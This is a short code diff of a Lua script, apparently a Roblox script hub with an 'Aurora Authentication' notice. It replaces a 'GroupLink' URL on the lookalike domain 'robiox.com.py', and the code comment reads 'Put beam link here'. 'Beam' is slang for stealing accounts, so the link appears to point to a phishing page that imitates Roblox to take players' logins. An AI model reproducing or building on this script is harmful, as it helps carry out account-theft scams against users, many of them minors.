@@ -10,7 +10,7 @@ if not success or not Fluent then
 end
 
 local GroupID = 31
-local GroupLink = "https://www.robiox.com.py/communities/315520623123/angless" -- Put beam link here
+local GroupLink = "https://www.robiox.com.py/communities/200797803427/angless" -- Put beam link here
 
 Fluent:Notify({
     Title = "Aurora Authentication",
